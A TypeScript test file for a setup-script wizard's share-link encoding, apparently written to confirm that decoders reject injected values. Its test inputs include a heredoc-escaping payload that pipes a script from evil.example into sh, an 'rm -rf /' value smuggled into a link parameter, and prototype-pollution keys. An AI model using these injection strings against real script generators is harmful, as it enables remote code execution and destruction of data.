import { describe, expect, test } from "bun:test";
import { assemble, buildScript, defaultSelections } from "./assemble";
import {
  decodeRoute,
  decodeSelections,
  encodeRoute,
  encodeSelections,
} from "./share";
import type { WizardSelections } from "./types";

function selections(overrides: Partial<WizardSelections> = {}): WizardSelections {
  return {
    ...defaultSelections(),
    ...overrides,
    toggles: { ...defaultSelections().toggles, ...(overrides.toggles ?? {}) },
    addons: { ...defaultSelections().addons, ...(overrides.addons ?? {}) },
  };
}

describe("encodeSelections / decodeSelections", () => {
  test("fresh page encodes to empty (no ?s= param)", () => {
    expect(encodeSelections(defaultSelections())).toBe("");
  });

  test("round-trips picks through base64url", () => {
    const sel = selections({
      platform: "web",
      appName: "shop",
      language: "typescript",
      framework: "nextjs",
      styling: "tailwind",
      packageManager: "bun",
      addons: { database: "supabase", auth: "supabase-auth" },
    });
    const raw = encodeSelections(sel);
    expect(raw.length).toBeGreaterThan(0);
    // URL-safe alphabet: no + / or = padding.
    expect(raw).not.toMatch(/[+/=]/);
    const back = decodeSelections(raw);
    expect(back?.framework).toBe("nextjs");
    expect(back?.appName).toBe("shop");
    expect(back?.packageManager).toBe("bun");
    expect(back?.addons.database).toBe("supabase");
    expect(back?.addons.auth).toBe("supabase-auth");
  });

  test("rejects null and garbage", () => {
    expect(decodeSelections(null)).toBeNull();
    expect(decodeSelections("!!!not-base64!!!")).toBeNull();
  });

  test("legacy 'none' addon values normalize to blank", () => {
    const sel = selections({ framework: "nextjs", addons: { database: "none" } });
    const back = decodeSelections(encodeSelections(sel));
    expect(back?.addons.database).toBe("");
  });
});

describe("encodeRoute / decodeRoute", () => {
  test("round-trips short links", () => {
    const sel = selections({
      language: "typescript",
      framework: "nextjs",
      styling: "tailwind",
      addons: { database: "supabase" },
    });
    const route = encodeRoute(sel);
    expect(route).toContain("f:nextjs");
    const back = decodeRoute(route);
    expect(back?.framework).toBe("nextjs");
    expect(back?.language).toBe("typescript");
    expect(back?.addons.database).toBe("supabase");
  });

  test("rejects null and token-less input", () => {
    expect(decodeRoute(null)).toBeNull();
    expect(decodeRoute("garbage-without-colon")).toBeNull();
  });

  test("ignores unknown codes but keeps known ones", () => {
    const back = decodeRoute("zz:nope+f:nextjs");
    expect(back?.framework).toBe("nextjs");
  });
});

describe("share decoders reject values the data does not contain", () => {
  // Proven by execution before the fix: decoded values land verbatim inside
  //   cat > START_HERE.md <<'EOF' … EOF
  // in setup.sh, so a newline + EOF ends the heredoc early and every line
  // after it runs when the user executes the script.
  const HEREDOC_PAYLOAD =
    "nextjs\nEOF\ncurl https://evil.example/x.sh | sh\ncat > /dev/null <<'EOF'\nx";

  test("a heredoc-breaking framework never survives a short link", () => {
    const back = decodeRoute(`l:typescript+f:${encodeURIComponent(HEREDOC_PAYLOAD)}+s:tailwind`);
    expect(back?.framework).toBe("");
    expect(back?.language).toBe("typescript");
  });

  test("a heredoc-breaking framework never survives a legacy ?s= link", () => {
    const raw = encodeSelections(selections({ framework: HEREDOC_PAYLOAD, language: "typescript" }));
    const back = decodeSelections(raw);
    expect(back?.framework).toBe("");
  });

  test("the generated script is free of the payload end to end", () => {
    const back = decodeRoute(`f:${encodeURIComponent(HEREDOC_PAYLOAD)}+l:typescript+s:tailwind`);
    expect(back).not.toBeNull();
    const script = buildScript(assemble(back!));
    expect(script).not.toContain("curl https://evil.example/x.sh | sh");
  });

  test("an invented addon id is dropped", () => {
    expect(decodeRoute("f:nextjs+db:oracle")?.addons.database).toBe("");
  });

  test("a hidden pick is dropped (nextauth on mobile)", () => {
    const back = decodeRoute("p:mobile+f:expo+au:nextauth");
    expect(back?.addons.auth).toBe("");
  });

  test("skills are filtered per id, not all-or-nothing", () => {
    expect(decodeRoute("f:nextjs+sk:tdd%2Crm%20-rf%20%2F%2Cshadcn")?.addons.skills).toBe("tdd,shadcn");
  });
});

describe("ROUTE_CODES lookups (defects 13 and 25)", () => {
  test("graphics round-trips through the gr: code", () => {
    const sel = selections({ framework: "nextjs", addons: { graphics: "fiber" } });
    const route = encodeRoute(sel);
    expect(route).toContain("gr:fiber");
    expect(decodeRoute(route)?.addons.graphics).toBe("fiber");
  });

  test("three round-trips on desktop", () => {
    const sel = selections({ platform: "desktop", framework: "tauri", addons: { graphics: "three" } });
    expect(decodeRoute(encodeRoute(sel))?.addons.graphics).toBe("three");
  });

  test("prototype keys do not resolve to a field", () => {
    for (const code of ["__proto__", "constructor", "toString", "hasOwnProperty", "valueOf"]) {
      const back = decodeRoute(`${code}:boom+f:nextjs`);
      expect(back?.framework).toBe("nextjs");
      expect(JSON.stringify(back)).not.toContain("boom");
    }
    expect(({} as Record<string, unknown>).boom).toBeUndefined();
  });
});

describe("toggles from links (defect 15)", () => {
  test('a JSON string "false" does not switch a toggle on', () => {
    const raw = encodeSelections({
      ...selections({ framework: "nextjs" }),
      toggles: { "eslint-prettier": "false", structure: "false" } as unknown as Record<string, boolean>,
    });
    const back = decodeSelections(raw);
    expect(back?.toggles["eslint-prettier"]).toBe(true);
    expect(back?.toggles.structure).toBe(true);
  });

  test("real toggle values still round-trip through short links", () => {
    const sel = selections({
      framework: "nextjs",
      toggles: { "eslint-prettier": false, husky: true, structure: false },
    });
    const back = decodeRoute(encodeRoute(sel));
    expect(back?.toggles["eslint-prettier"]).toBe(false);
    expect(back?.toggles.husky).toBe(true);
    expect(back?.toggles.structure).toBe(false);
  });
});

describe("full round-trip of a fully loaded setup", () => {
  const loaded = selections({
    platform: "web",
    appName: "shop-front",
    language: "typescript",
    framework: "nextjs",
    styling: "tailwind",
    packageManager: "bun",
    toggles: { "eslint-prettier": false, husky: true, structure: true },
    addons: {
      backend: "express",
      database: "postgres",
      orm: "prisma",
      auth: "clerk",
      payments: "stripe",
      graphics: "fiber",
      testing: "playwright",
      cicd: "github-actions",
      ai: "claude",
      skills: "tdd,shadcn",
    },
  });

  test("short route link survives every field", () => {
    const back = decodeRoute(encodeRoute(loaded));
    expect(back).toEqual(loaded);
  });

  test("legacy ?s= link survives every field", () => {
    const back = decodeSelections(encodeSelections(loaded));
    expect(back).toEqual(loaded);
  });

  test("decoding is idempotent", () => {
    const once = decodeRoute(encodeRoute(loaded))!;
    expect(decodeRoute(encodeRoute(once))).toEqual(once);
  });
});
